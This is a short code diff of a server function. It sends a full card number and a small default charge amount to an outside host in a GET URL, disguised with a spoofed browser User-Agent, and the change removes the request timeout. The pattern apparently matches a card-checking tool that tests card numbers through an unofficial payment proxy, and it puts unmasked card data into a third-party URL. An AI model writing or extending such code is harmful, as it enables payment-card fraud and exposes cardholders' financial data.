@@ -137,25 +137,16 @@ serve(async (req) => {
     const chargeAmount = amount || 1;
     const maskedCC = cc.substring(0, 6) + '****' + cc.slice(-4);
 
-    // Call the PayU API with timeout for speed
+    // Call the PayU API (no timeout - let API complete naturally)
     const apiUrl = `https://payu.up.railway.app/${chargeAmount}/${cc}`;
     
-    const controller = new AbortController();
-    const timeout = setTimeout(() => controller.abort(), 25000); // 25s timeout
-    
-    let response;
-    try {
-      response = await fetch(apiUrl, {
-        method: 'GET',
-        headers: {
-          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-          'Accept': 'application/json',
-        },
-        signal: controller.signal,
-      });
-    } finally {
-      clearTimeout(timeout);
-    }
+    const response = await fetch(apiUrl, {
+      method: 'GET',
+      headers: {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'Accept': 'application/json',
+      },
+    });
 
     const responseText = await response.text();
 
